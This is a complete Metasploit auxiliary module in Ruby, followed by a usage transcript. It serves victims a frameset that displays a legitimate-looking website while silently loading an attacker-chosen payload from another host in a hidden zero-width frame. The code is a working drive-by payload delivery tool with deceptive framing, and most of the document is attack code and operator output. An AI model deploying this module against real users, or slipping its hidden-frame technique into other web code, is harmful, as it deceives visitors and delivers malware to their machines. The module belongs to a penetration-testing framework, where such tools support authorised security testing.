#
# $Id:  $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::HttpClient

        def initialize(info = {})
                super(update_info(info,
			'Name'           => 'HTML Frame Payload',
			'Description'    => %q{
					This auxiliary module serves a payload via HTML frame.
					It serves a full browser frame to appear to be at a
					legit website and loads the payload in an unseen frame.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['Marcus J. Carey <mjc[at]threatagent.com>'],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.metasploit.com'],
				]))
                register_options(
                        [
                                OptString.new('DISPLAY_URL', [false, "www.foo.tld - Webpage to display to victim."]),			
                                OptString.new('PAYLOAD_URL', [true, "foo.tld/exploit.jar - URL of payload."]),			
                                OptString.new('SRVHOST', [true, "Local HTTP Server IP Address", "#{Rex::Socket.source_address}"]),
                                OptInt.new('SRVPORT', [true, "Local HTTP Server Port",80]),
                                OptString.new('URIPATH', [false, "The URI to use for this module (default is \"/\")", "/"]),
                                OptString.new('RHOST', [false, "DISPLAY_URL provides RHOST"]),			
                                OptString.new('RPORT', [false, "DISPLAY_URL Server Port", 80]),	
                        ], self.class)
        end

	def get_title 
		if datastore['DISPLAY_URL'] =~ /\//
			url = datastore['DISPLAY_URL']
			datastore['RHOST'] = url[0,url.index("/")]			
			uri_path = url[url.index("/"),url.length - url.index("/")]
		else
			datastore['RHOST'] = datastore['DISPLAY_URL']
			uri_path = "\/"
		end

		page = send_request_raw({
			'version'      => '1.0',
			'uri'          => "#{uri_path}",
			'method'       => 'GET'}, 3)

		if page
			page = page.to_s
			title = page[page.index("<title>") + 7, page.index("</title>") - page.index("<title>") - 7]	
		end
		
		return title
	end

        def on_request_uri(cli, request)
		
		if request.uri =~ /=/
			datastore['DISPLAY_URL'] = request.uri.split("=")[1] 
		end
		
		unless request.uri =~ /favicon/
			print_good("Displaying #{datastore['DISPLAY_URL']} to #{cli.peerhost}")
		end 	

 		content = %Q{<html>
			<head><title>#{get_title}</title></head>
			<frameset cols="100%,0%" noresize="noresize">
			<frame src="http://#{datastore['DISPLAY_URL']}" />
			<frame src="http://#{datastore['PAYLOAD_URL']}" />
			</frameset>	
			</html>}

		content = content.gsub("\t\t\t","")
    		send_response(cli, content, {'Content-Type'=>'text/html'})
        end

        def run
		exploit
        end
end

=begin

msf > use auxiliary/server/html_frame_payload 
msf  auxiliary(html_frame_payload) > show options

Module options (auxiliary/server/html_frame_payload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DISPLAY_URL                   no        www.foo.tld - Webpage to display to victim.
   PAYLOAD_URL                   yes       foo.tld/exploit.jar - URL of payload.
   Proxies                       no        Use a proxy chain
   RHOST                         no        DISPLAY_URL provides RHOST
   RPORT        80               no        DISPLAY_URL Server Port
   SRVHOST      192.168.171.153  yes       Local HTTP Server IP Address
   SRVPORT      80               yes       Local HTTP Server Port
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH      /                no        The URI to use for this module (default is "/")
   VHOST                         no        HTTP server virtual host

msf  auxiliary(html_frame_payload) > set display_url www.metasploit.com/download/
display_url => www.metasploit.com/download/
msf  auxiliary(html_frame_payload) > set payload_url downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe
payload_url => downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe
msf  auxiliary(html_frame_payload) > run

[*] Using URL: http://192.168.171.153:80/
[*] Server started.
[+] Displaying www.metasploit.com/download/ to 192.168.171.153

=end
